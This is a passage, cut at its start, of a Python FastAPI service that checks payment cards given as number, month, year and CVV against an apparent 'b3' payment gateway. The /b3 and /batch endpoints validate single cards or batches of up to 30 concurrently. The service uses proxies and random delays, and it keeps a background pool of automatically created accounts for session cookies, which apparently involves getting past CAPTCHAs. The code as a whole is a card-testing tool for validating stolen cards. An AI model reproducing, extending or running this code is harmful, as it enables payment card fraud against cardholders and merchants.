            f = f"{sp[0]}|{sp[1]}|{sp[2]}|{sp[3]}"
            if f not in cards:
                cards.append(f)
                if len(cards) >= 30: break
    return cards[:30]

def process_single_card(card_item, proxy):
    parts = re.split(r'[|:]', card_item)
    if len(parts) >= 4:
        time.sleep(random.uniform(1.0, 2.5))
        return check_card(parts[0], parts[1], parts[2], parts[3], proxy=proxy)
    return {"card": card_item, "response": "Invalid format", "time": "0.0s", "credit": CREDIT}

# ─── FastAPI Endpoints ───────────────────────────────────────

@app.get("/")
def root():
    d = stats_payload()
    d["gateway"] = GATEWAY_NAME
    d["credit"] = CREDIT
    return d

@app.get("/b3")
def b3(cc: str = None, acc: str = None, account: str = None, p: str = None):
    if account is not None:
        pool = load_pool()
        d = stats_payload()
        d["accounts"] = [{"email": a["email"], "created": a.get("created_at", "?")} for a in pool]
        d["credit"] = CREDIT
        return d

    if acc is not None:
        acc_str = str(acc).strip().lower()
        if acc_str in ("0", "status", "info"):
            pool = load_pool()
            d = stats_payload()
            d["pool_size"] = d["total_cookies"]
            d["accounts"] = [{"email": a["email"], "created": a.get("created_at", "?")} for a in pool]
            d["credit"] = CREDIT
            return d
        try:
            count = max(1, int(acc))
        except:
            count = 4
        pool = load_pool()
        with _building_lock:
            building = _building_count
        # hard ceiling — manual requests can never push the pool past MAX
        allowed = MAX_ACCOUNTS - len(pool) - building
        if allowed <= 0:
            return {
                "status": "max_reached",
                "creating": 0,
                "current_pool": len(pool),
                "building": building,
                "max_accounts": MAX_ACCOUNTS,
                "min_accounts": MIN_ACCOUNTS,
                "message": f"Pool at ceiling ({MAX_ACCOUNTS}) — creation auto-stopped.",
                "credit": CREDIT
            }
        count = min(count, allowed)
        t = threading.Thread(target=create_accounts_bg, args=(count, p), daemon=True)
        t.start()
        return {
            "status": "creating",
            "creating": count,
            "current_pool": len(pool),
            "building": building,
            "max_accounts": MAX_ACCOUNTS,
            "min_accounts": MIN_ACCOUNTS,
            "message": f"Account creation started for {count} accounts in background. Check /b3?acc=0 for status.",
            "credit": CREDIT
        }

    if not cc:
        return JSONResponse(status_code=400, content={"error": "Missing cc or acc param", "gateway": GATEWAY_NAME, "credit": CREDIT})
    parts = re.split(r'[|:]', cc)
    if len(parts) >= 4:
        return check_card(parts[0], parts[1], parts[2], parts[3], proxy=p)
    return JSONResponse(status_code=400, content={"error": "Format: cc|mm|yy|cvv", "gateway": GATEWAY_NAME, "credit": CREDIT})

@app.get("/batch")
def batch(cc: str = None, c: str = None, p: str = None):
    raw = cc or c
    if not raw:
        return JSONResponse(status_code=400, content={"error": "Missing cc/c param", "gateway": GATEWAY_NAME, "credit": CREDIT})
    cards = parse_card_list(raw)
    if not cards:
        return JSONResponse(status_code=400, content={"error": "No valid cards", "gateway": GATEWAY_NAME, "credit": CREDIT})

    t0 = time.time()
    results = []
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = {}
        for card in cards:
            parts = re.split(r'[|:]', card)
            if len(parts) >= 4:
                futs[ex.submit(process_single_card, card, p)] = card
            else:
                results.append({"card": card, "response": "Invalid format", "time": "0.0s", "credit": CREDIT})
        for f in as_completed(futs):
            try:
                results.append(f.result())
            except Exception as e:
                results.append({"card": futs[f], "response": str(e), "time": "0.0s", "credit": CREDIT})

    return {"results": results, "total_cards": len(results), "gateway": GATEWAY_NAME,
            "total_time": f"{time.time()-t0:.1f}s", "credit": CREDIT}

@app.get("/stop")
def stop_creating():
    _stop_creating_event.set()
    d = stats_payload()
    d["status"] = "stopped"
    d["message"] = ("Account creation stopped. Pending workers cancelled; "
                    "in-flight accounts abort at their next checkpoint "
                    "(page load / captcha / submit).")
    d["credit"] = CREDIT
    return d

# ─── Main ────────────────────────────────────────────────────

@app.on_event("startup")
def _pool_guard_start():
    # floor check on boot + watchdog every 30s forever
    try:
        maybe_auto_refill()
    except Exception:
        pass
    threading.Thread(target=_pool_watchdog, daemon=True).start()

if __name__ == "__main__":
    if len(sys.argv) > 1:
        cli_arg = sys.argv[1]
        cli_proxy = sys.argv[2] if len(sys.argv) > 2 else None
        parts = re.split(r'[|:]', cli_arg)
        if len(parts) >= 4:
            res = check_card(parts[0], parts[1], parts[2], parts[3], proxy=cli_proxy)
            print(json.dumps(res, indent=2))
            sys.exit(0)

    port = int(os.environ.get("PORT", 8000))
    pool = load_pool()
    print(f"Cookie pool: {len(pool)} accounts (min {MIN_ACCOUNTS} / max {MAX_ACCOUNTS})")
    try:
        maybe_auto_refill()
        threading.Thread(target=_pool_watchdog, daemon=True).start()
    except Exception:
        pass
    print(f"Starting FastAPI on port {port}")
    uvicorn.run(app, host="0.0.0.0", port=port)
